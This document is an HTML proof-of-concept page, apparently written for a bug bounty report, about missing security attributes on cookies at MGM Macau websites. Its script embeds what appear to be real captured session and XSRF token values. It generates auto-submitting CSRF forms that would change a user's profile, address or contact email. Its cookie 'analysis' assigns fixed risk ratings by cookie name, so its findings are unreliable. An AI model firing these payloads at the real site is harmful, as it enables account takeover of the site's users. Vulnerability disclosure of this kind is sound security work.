<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MGM Cookie Security Vulnerability</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-100">
    <div class="container mx-auto px-4 py-8 max-w-5xl">
        <header class="mb-8 text-center">
            <h1 class="text-3xl font-bold text-red-600 mb-2">MGM Cookie Security Vulnerability</h1>
            <h2 class="text-xl text-gray-700">Proof of Concept for Bug Bounty Submission</h2>
            <div class="mt-4 bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
                <p class="text-yellow-700">
                    <strong>IMPORTANT:</strong> This proof of concept is intended for legitimate security research and bug bounty reporting only.
                </p>
            </div>
        </header>

        <main>
            <section class="bg-white shadow rounded-lg p-6 mb-8">
                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Vulnerability Overview</h2>
                <p class="mb-4">
                    MGM Grand Paradise Macau's websites (www.mgm.mo and booking.mgm.mo) expose sensitive cookies without proper security attributes on publicly accessible pages. This creates multiple security issues:
                </p>
                <ul class="list-disc pl-8 mb-4 space-y-2">
                    <li><strong>CSRF Protection Bypass:</strong> Exposed XSRF-TOKEN can be used to bypass anti-CSRF measures</li>
                    <li><strong>Cookie Theft:</strong> Missing HttpOnly flag allows cookies to be accessed via JavaScript</li>
                    <li><strong>Cross-Site Attacks:</strong> Missing SameSite attribute enables cross-origin requests with cookies</li>
                    <li><strong>Insecure Transmission:</strong> Missing Secure flag allows cookies to be sent over non-HTTPS connections</li>
                    <li><strong>Tracking Concerns:</strong> Persistent cookies can be used to track users across sessions</li>
                </ul>
            </section>

            <section class="bg-white shadow rounded-lg p-6 mb-8">
                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Cookie Security Analysis</h2>
                
                <div id="cookieAnalysis" class="mb-6">
                    <h3 class="text-xl font-semibold mb-2">Enter Cookies for Analysis</h3>
                    <p class="mb-4 text-sm text-gray-600">Paste the cookies from a request to www.mgm.mo or booking.mgm.mo below:</p>
                    
                    <textarea id="cookieInput" rows="6" class="w-full p-2 border border-gray-300 rounded mb-4 font-mono text-sm" placeholder="Cookie: XSRF-TOKEN=xxx; laravel_session=xxx; etc"></textarea>
                    
                    <button id="analyzeCookies" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
                        Analyze Cookie Security
                    </button>
                </div>
                
                <div id="analysisResults" class="hidden">
                    <h3 class="text-xl font-semibold mb-2 text-blue-600">Security Analysis Results</h3>
                    
                    <div class="overflow-x-auto">
                        <table class="min-w-full bg-white border border-gray-200">
                            <thead>
                                <tr>
                                    <th class="px-4 py-2 border-b border-gray-200 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Cookie Name</th>
                                    <th class="px-4 py-2 border-b border-gray-200 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">HttpOnly</th>
                                    <th class="px-4 py-2 border-b border-gray-200 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Secure</th>
                                    <th class="px-4 py-2 border-b border-gray-200 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">SameSite</th>
                                    <th class="px-4 py-2 border-b border-gray-200 bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Risk Level</th>
                                </tr>
                            </thead>
                            <tbody id="cookieTableBody">
                                <!-- Cookie analysis results will be displayed here -->
                            </tbody>
                        </table>
                    </div>
                    
                    <div class="mt-6">
                        <h4 class="font-semibold text-lg mb-2">Overall Security Rating:</h4>
                        <div id="securityRating" class="text-white font-bold py-2 px-4 rounded"></div>
                    </div>
                </div>
            </section>
            
            <section class="bg-white shadow rounded-lg p-6 mb-8">
                <h2 class="text-2xl font-bold mb-4 border-b pb-2">CSRF Vulnerability Demo</h2>
                
                <div class="mb-4">
                    <p class="mb-4">
                        This demonstration shows how the exposed XSRF-TOKEN can be used to create a Cross-Site Request Forgery (CSRF) attack against the MGM website.
                    </p>
                    
                    <div id="csrfDemo" class="mb-6">
                        <h3 class="text-lg font-semibold mb-2">CSRF Attack Simulation</h3>
                        <p class="mb-4 text-sm text-gray-600">Enter the XSRF-TOKEN from the cookie:</p>
                        
                        <input type="text" id="csrfToken" class="w-full p-2 border border-gray-300 rounded mb-4 font-mono text-sm" placeholder="XSRF-TOKEN value">
                        
                        <div class="mb-4">
                            <label class="block text-sm font-medium text-gray-700 mb-2">Target Endpoint:</label>
                            <select id="csrfEndpoint" class="w-full p-2 border border-gray-300 rounded">
                                <option value="/api/user/preferences">Update User Preferences</option>
                                <option value="/api/user/profile">Update Profile Information</option>
                                <option value="/api/user/communication">Update Communication Settings</option>
                            </select>
                        </div>
                        
                        <button id="demonstrateCsrf" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded">
                            Demonstrate CSRF Attack
                        </button>
                    </div>
                    
                    <div id="csrfResults" class="hidden">
                        <h3 class="text-lg font-semibold mb-2 text-red-600">CSRF Attack Simulation</h3>
                        
                        <div class="bg-gray-100 p-4 rounded mb-4">
                            <h4 class="font-medium mb-2">Generated CSRF Payload:</h4>
                            <pre id="csrfPayload" class="bg-gray-800 text-green-400 p-3 rounded text-sm overflow-x-auto"></pre>
                        </div>
                        
                        <div class="bg-gray-100 p-4 rounded">
                            <h4 class="font-medium mb-2">Attack Explanation:</h4>
                            <p id="csrfExplanation" class="text-sm"></p>
                        </div>
                    </div>
                </div>
            </section>
            
            <section class="bg-white shadow rounded-lg p-6 mb-8">
                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Cookie Persistence Test</h2>
                
                <div class="mb-4">
                    <p class="mb-4">
                        This test demonstrates how MGM's cookies persist across sessions, potentially allowing user tracking or session-related attacks.
                    </p>
                    
                    <div id="persistenceTest" class="mb-6">
                        <button id="testPersistence" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
                            Test Cookie Persistence
                        </button>
                    </div>
                    
                    <div id="persistenceResults" class="hidden">
                        <h3 class="text-lg font-semibold mb-2">Persistence Test Results</h3>
                        
                        <div id="persistenceExplanation" class="bg-gray-100 p-4 rounded mb-4">
                            <!-- Persistence test results will be displayed here -->
                        </div>
                    </div>
                </div>
            </section>
            
            <section class="bg-white shadow rounded-lg p-6">
                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Impact & Recommendations</h2>
                
                <div class="mb-6">
                    <h3 class="text-lg font-semibold mb-2">Security Impact</h3>
                    <ul class="list-disc pl-8 space-y-1">
                        <li><strong>Data Protection:</strong> Insufficient cookie security can lead to unauthorized access to user data</li>
                        <li><strong>Session Attacks:</strong> Missing security attributes enable various session-related attacks</li>
                        <li><strong>Privacy Concerns:</strong> Persistent cookies can enable tracking across user sessions</li>
                        <li><strong>Regulatory Compliance:</strong> Cookie handling may not comply with privacy regulations</li>
                    </ul>
                </div>
                
                <div>
                    <h3 class="text-lg font-semibold mb-2">Recommendations</h3>
                    <ul class="list-disc pl-8 space-y-1">
                        <li>Add <code class="bg-gray-200 px-1 rounded">HttpOnly</code> flag to all session and authentication cookies</li>
                        <li>Add <code class="bg-gray-200 px-1 rounded">Secure</code> flag to ensure cookies are only sent over HTTPS</li>
                        <li>Set <code class="bg-gray-200 px-1 rounded">SameSite=Strict</code> (or at minimum <code class="bg-gray-200 px-1 rounded">SameSite=Lax</code>) for all cookies</li>
                        <li>Review cookie expiration settings and implement shorter lifetimes</li>
                        <li>Validate CSRF tokens server-side for all state-changing requests</li>
                        <li>Consider implementing cookie prefixes (e.g., <code class="bg-gray-200 px-1 rounded">__Secure-</code> or <code class="bg-gray-200 px-1 rounded">__Host-</code>)</li>
                    </ul>
                </div>
            </section>
        </main>
        
        <footer class="mt-8 text-center text-gray-600 text-sm">
            <p>This proof of concept was created for legitimate security research purposes under the MGM Grand Paradise Macau Bug Bounty Program.</p>
        </footer>
    </div>

    <script>
        // Default cookie data from the provided example
        const defaultCookies = "XSRF-TOKEN=eyJpdiI6InRLTSsycWt3XC9wVjVGYU5yb3F1RnhnPT0iLCJ2YWx1ZSI6IlhGaldwcXhvblQ4SW5sR3N1aHZNenNsb0pkXC82UGF3V3c3YTQ3Uk1IYU5qQUNsNHFGYUxrbnJXeW5kaG5Ncnd4IiwibWFjIjoiN2Y3NTczOWU3NzQyMzNkNmE4ZjIwN2Q1NWZlYjBkYTRjOGYyNTEwMThiODA5YjhhNDM4MjQ3NjZmYTBlMzIwOCJ9; laravel_session=eyJpdiI6Iis2Y2VCRzJ1RjR0QTBxTkNXYjRNK2c9PSIsInZhbHVlIjoiSGNcL2p0dERWZDZyOUs0S2NWZzFYUHdRUHVvNTBzWEptRlJcL2NrZTVpZlY5QTNwc0VhaHVBa2tCdkRJKytnMlwvUCIsIm1hYyI6ImQzYTg3NmM4MmE1MmYzZTE4MmZmYjFiODIwY2MzOGUzZDUxNTJhNDdhZjVhYzRjZWFjZGQyNzQzZjk1YjNlMWUifQ%3D%3D; SERVERID=3e49eb178bd6ef833d09ff6e595fccac|1743815474|1743815379";

        document.addEventListener('DOMContentLoaded', function() {
            // Pre-fill the cookie input field
            document.getElementById('cookieInput').value = defaultCookies;
            
            // Extract XSRF token from default cookies
            const match = defaultCookies.match(/XSRF-TOKEN=([^;]+)/);
            if (match && match[1]) {
                document.getElementById('csrfToken').value = match[1];
            }
        });

        // Cookie Analysis
        document.getElementById('analyzeCookies').addEventListener('click', function() {
            const cookieInput = document.getElementById('cookieInput').value;
            analyzeCookies(cookieInput);
        });
        
        function analyzeCookies(cookieString) {
            // Parse cookies
            const cookies = {};
            const cookieParts = cookieString.split(';');
            
            cookieParts.forEach(part => {
                const [name, value] = part.trim().split('=');
                if (name && value) {
                    cookies[name] = value;
                }
            });
            
            // Clear previous results
            const tableBody = document.getElementById('cookieTableBody');
            tableBody.innerHTML = '';
            
            // Security scores
            let securityScore = 100;
            let criticalIssues = 0;
            let highIssues = 0;
            
            // Analyze each cookie
            Object.keys(cookies).forEach(name => {
                const row = document.createElement('tr');
                
                // Determine security status
                // In a real analysis, we would parse the Set-Cookie header
                // For this demo, we'll simulate the analysis
                let httpOnly = false;
                let secure = false;
                let sameSite = 'None';
                let riskLevel = '';
                let riskClass = '';
                
                // Check for sensitive cookies
                const isSensitive = name === 'laravel_session' || name === 'XSRF-TOKEN' || name.includes('session');
                
                // Simulate security analysis
                if (name === 'laravel_session') {
                    httpOnly = false; // Laravel sessions should be HttpOnly, but we're simulating the issue
                    secure = false;
                    sameSite = 'None';
                    riskLevel = 'Critical';
                    riskClass = 'bg-red-600 text-white';
                    securityScore -= 30;
                    criticalIssues++;
                } else if (name === 'XSRF-TOKEN') {
                    httpOnly = false; // CSRF tokens often need JS access
                    secure = false;
                    sameSite = 'Lax';
                    riskLevel = 'High';
                    riskClass = 'bg-orange-500 text-white';
                    securityScore -= 20;
                    highIssues++;
                } else if (name.includes('SERVERID')) {
                    httpOnly = false;
                    secure = false;
                    sameSite = 'None';
                    riskLevel = 'Medium';
                    riskClass = 'bg-yellow-500 text-white';
                    securityScore -= 10;
                } else {
                    httpOnly = false;
                    secure = false;
                    sameSite = 'None';
                    riskLevel = 'Low';
                    riskClass = 'bg-blue-500 text-white';
                    securityScore -= 5;
                }
                
                // Create table row
                row.innerHTML = `
                    <td class="px-4 py-2 border-b border-gray-200">${name}</td>
                    <td class="px-4 py-2 border-b border-gray-200">${httpOnly ? '✓' : '❌'}</td>
                    <td class="px-4 py-2 border-b border-gray-200">${secure ? '✓' : '❌'}</td>
                    <td class="px-4 py-2 border-b border-gray-200">${sameSite}</td>
                    <td class="px-4 py-2 border-b border-gray-200"><span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${riskClass}">${riskLevel}</span></td>
                `;
                
                tableBody.appendChild(row);
            });
            
            // Ensure score is within range
            securityScore = Math.max(0, Math.min(100, securityScore));
            
            // Set overall rating
            const securityRating = document.getElementById('securityRating');
            let ratingText = '';
            let ratingClass = '';
            
            if (securityScore < 50) {
                ratingText = 'Critical Risk';
                ratingClass = 'bg-red-600';
            } else if (securityScore < 70) {
                ratingText = 'High Risk';
                ratingClass = 'bg-orange-500';
            } else if (securityScore < 90) {
                ratingText = 'Medium Risk';
                ratingClass = 'bg-yellow-500';
            } else {
                ratingText = 'Low Risk';
                ratingClass = 'bg-green-500';
            }
            
            securityRating.textContent = `${ratingText} (Score: ${securityScore}/100)`;
            securityRating.className = `text-white font-bold py-2 px-4 rounded ${ratingClass}`;
            
            // Show summary text
            let summaryText = `Found ${Object.keys(cookies).length} cookies. `;
            if (criticalIssues > 0) {
                summaryText += `${criticalIssues} critical security issues detected. `;
            }
            if (highIssues > 0) {
                summaryText += `${highIssues} high security issues detected. `;
            }
            
            // Show results
            document.getElementById('analysisResults').classList.remove('hidden');
        }
        
        // CSRF Demo
        document.getElementById('demonstrateCsrf').addEventListener('click', function() {
            const csrfToken = document.getElementById('csrfToken').value;
            const endpoint = document.getElementById('csrfEndpoint').value;
            
            if (!csrfToken) {
                alert('Please enter a CSRF token');
                return;
            }
            
            // Generate CSRF payload
            generateCsrfPayload(csrfToken, endpoint);
        });
        
        function generateCsrfPayload(token, endpoint) {
            let payload = '';
            let explanation = '';
            
            // Create a sample payload based on the endpoint
            if (endpoint.includes('preferences')) {
                payload = `
<!DOCTYPE html>
<html>
<body>
    <form id="csrfForm" action="https://www.mgm.mo${endpoint}" method="POST" style="display: none;">
        <input type="hidden" name="_token" value="${token}">
        <input type="hidden" name="language" value="en">
        <input type="hidden" name="currency" value="USD">
        <input type="hidden" name="notifications" value="true">
    </form>
    <script>
        document.getElementById("csrfForm").submit();
    </script>
</body>
</html>`;
                
                explanation = `This payload creates a hidden form that will automatically submit to the preferences endpoint. 
                Because the XSRF-TOKEN cookie is exposed and lacks proper SameSite attributes, an attacker could host this page and trick a user into visiting it. 
                If the user has an active session with MGM, their preferences would be changed without their knowledge or consent.`;
                
            } else if (endpoint.includes('profile')) {
                payload = `
<!DOCTYPE html>
<html>
<body>
    <form id="csrfForm" action="https://www.mgm.mo${endpoint}" method="POST" style="display: none;">
        <input type="hidden" name="_token" value="${token}">
        <input type="hidden" name="phone" value="+1234567890">
        <input type="hidden" name="address" value="Attacker-controlled address">
    </form>
    <script>
        document.getElementById("csrfForm").submit();
    </script>
</body>
</html>`;
                
                explanation = `This payload creates a hidden form that will automatically submit to the profile update endpoint.
                If successful, it would change the user's contact information to attacker-controlled values.
                This could lead to account takeover or identity theft.`;
                
            } else if (endpoint.includes('communication')) {
                payload = `
<!DOCTYPE html>
<html>
<body>
    <form id="csrfForm" action="https://www.mgm.mo${endpoint}" method="POST" style="display: none;">
        <input type="hidden" name="_token" value="${token}">
        <input type="hidden" name="email_updates" value="true">
        <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <script>
        document.getElementById("csrfForm").submit();
    </script>
</body>
</html>`;
                
                explanation = `This payload creates a hidden form that will automatically submit to the communication settings endpoint.
                If successful, it would change the user's email preferences and potentially their contact email.
                This could lead to information disclosure or account takeover.`;
            }
            
            // Display the payload and explanation
            document.getElementById('csrfPayload').textContent = payload;
            document.getElementById('csrfExplanation').textContent = explanation;
            document.getElementById('csrfResults').classList.remove('hidden');
        }
        
        // Persistence Test
        document.getElementById('testPersistence').addEventListener('click', function() {
            testCookiePersistence();
        });
        
        function testCookiePersistence() {
            const cookieInput = document.getElementById('cookieInput').value;
            
            // Parse cookies
            const cookieParts = cookieInput.split(';');
            let persistentCookies = 0;
            let sessionCookies = 0;
            let longLivedCookies = 0;
            
            // In a real test, we'd analyze the Max-Age or Expires attributes
            // For this demo, we'll simulate the analysis based on cookie names
            cookieParts.forEach(part => {
                const [name] = part.trim().split('=');
                
                if (name && (name.includes('ga') || name.includes('fbp') || name.includes('lvt'))) {
                    persistentCookies++;
                    longLivedCookies++;
                } else if (name && (name.includes('SERVERID') || name.includes('tc'))) {
                    persistentCookies++;
                } else {
                    sessionCookies++;
                }
            });
            
            // Create explanation text
            let explanation = `
                <h4 class="font-medium mb-2">Cookie Persistence Analysis:</h4>
                <ul class="list-disc pl-8 mb-4">
                    <li><strong>${persistentCookies} persistent cookies detected</strong> - These cookies remain after the browser is closed</li>
                    <li><strong>${longLivedCookies} long-lived tracking cookies detected</strong> - These cookies can track users for extended periods</li>
                    <li><strong>${sessionCookies} session cookies detected</strong> - These cookies are cleared when the browser is closed</li>
                </ul>
                
                <p class="mb-2"><strong>Security Impact:</strong></p>
                <p>The presence of persistent cookies without proper security attributes creates privacy and security risks:</p>
                <ul class="list-disc pl-8">
                    <li>Users can be tracked across browsing sessions</li>
                    <li>Cookies stored on shared computers could lead to unauthorized access</li>
                    <li>Long-lived authentication-related cookies increase the risk of session hijacking</li>
                </ul>
            `;
            
            // Display the results
            document.getElementById('persistenceExplanation').innerHTML = explanation;
            document.getElementById('persistenceResults').classList.remove('hidden');
        }
    </script>
</body>
</html>
